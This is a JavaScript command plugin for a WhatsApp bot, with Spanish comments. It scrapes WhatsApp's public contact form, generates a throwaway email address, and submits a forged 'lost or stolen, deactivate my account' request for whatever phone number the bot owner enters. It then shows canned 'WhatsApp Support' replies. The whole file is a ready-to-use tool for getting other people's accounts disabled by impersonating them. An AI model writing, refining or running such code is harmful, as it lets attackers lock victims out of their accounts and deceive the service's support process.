import cheerio from "cheerio";
import axios from "axios";
import util from "util";

let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
  const q = args.join(" ");
  
  // Validación de entrada
  if (!q || !args[0]) throw '*[❗] INGRESE EL NÚMERO QUE DESEE DESACTIVAR EN FORMATO INTERNACIONAL, EJEMPLO: +1 (450) 555-555*';
  
  // Obteniendo los datos de la página de contacto de WhatsApp
  let ntah;
  try {
    ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
    console.log('Datos de la página de contacto obtenidos correctamente.');
  } catch (error) {
    console.error('Error al obtener la página de contacto:', error);
    throw 'Error al obtener datos de la página de contacto de WhatsApp.';
  }

  // Obteniendo un correo aleatorio
  let email;
  try {
    email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10");
    console.log('Correo aleatorio generado:', email.data);
    if (!email.data || email.data.length === 0) throw new Error('No se generaron correos.');
  } catch (error) {
    console.error('Error al generar correo aleatorio:', error);
    throw 'Error al generar un correo aleatorio.';
  }

  // Extrayendo las cookies y el formulario de la página
  let cookie = ntah.headers["set-cookie"]?.join("; ");
  if (!cookie) throw 'Error: No se pudieron obtener las cookies.';
  let $ = cheerio.load(ntah.data);
  let $form = $("form");
  if (!$form.length) throw 'Error: No se encontró el formulario en la página.';
  let url = new URL($form.attr("action"), "https://www.whatsapp.com").href;

  // Validar campos del formulario
  let jazoest = $form.find("input[name=jazoest]").val();
  let lsd = $form.find("input[name=lsd]").val();
  if (!jazoest || !lsd) {
    console.error('Valores del formulario no encontrados:', { jazoest, lsd });
    throw 'Error: No se pudieron obtener los valores ocultos del formulario.';
  }

  // Preparando los datos para enviar el formulario
  let form = new URLSearchParams();
  form.append("jazoest", jazoest);
  form.append("lsd", lsd);
  form.append("step", "submit");
  form.append("country_selector", "ID");
  form.append("phone_number", q);
  form.append("email", email.data[0]);
  form.append("email_confirm", email.data[0]);
  form.append("platform", "ANDROID");
  form.append("your_message", "Perdido/roubado: desative minha conta: " + q);
  form.append("__user", "0");
  form.append("__a", "1");
  form.append("__csr", "");
  form.append("__req", "8");
  form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
  form.append("dpr", "1");
  form.append("__ccg", "UNKNOWN");
  form.append("__rev", "1006630858");
  form.append("__comment_req", "0");

  console.log('Datos del formulario listos:', form.toString());

  // Realizando la petición POST con los datos del formulario
  let res;
  try {
    res = await axios({ url, method: "POST", data: form, headers: { cookie } });
    console.log('Respuesta del servidor:', res.data);
  } catch (error) {
    console.error('Error al enviar la solicitud de desactivación:', error);
    throw 'Error al enviar la solicitud de desactivación.';
  }

  // Procesando la respuesta
  let payload = String(res.data);

  if (payload.includes(`"payload":true`)) {
    m.reply(`##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta está deshabilitada temporalmente y se eliminará automáticamente en 30 días si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atención al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nDurante el período de cierre:\n • Es posible que sus contactos en WhatsApp aún vean su nombre y foto de perfil.\n • Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecerá en estado pendiente por hasta 30 días.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.\nVuelva a registrar su cuenta ingresando el código de 6 dígitos, el código que recibe por SMS o llamada telefónica. Si te vuelves a registrar\n\nSi tiene alguna otra pregunta o inquietud, no dude en ponerse en contacto con nosotros. Estaremos encantados de ayudar!`);
  } else if (payload.includes(`"payload":false`)) {
    m.reply(`##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este número de teléfono te pertenece. Por favor, envíanos documentación que nos permita verificar que el número es de tu propiedad, como una copia de la factura telefónica o el contrato de servicio.\n\nPor favor, asegúrate de ingresar tu número de teléfono en formato internacional completo. Para obtener más información sobre el formato internacional, consulta este artículo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`);
  } else {
    try {
      const parsedData = JSON.parse(res.data.replace("for (;;);", ""));
      m.reply(util.format(parsedData));
    } catch (e) {
      console.error('Error al procesar la respuesta:', res.data);
      m.reply('Hubo un error al procesar la respuesta de WhatsApp.');
    }
  }
};

handler.command = /^(supportwa|swa|soporte|support|desactivarwa|mandsupport)$/i;
handler.rowner = true;
handler.tags = ['owner'];

export default handler;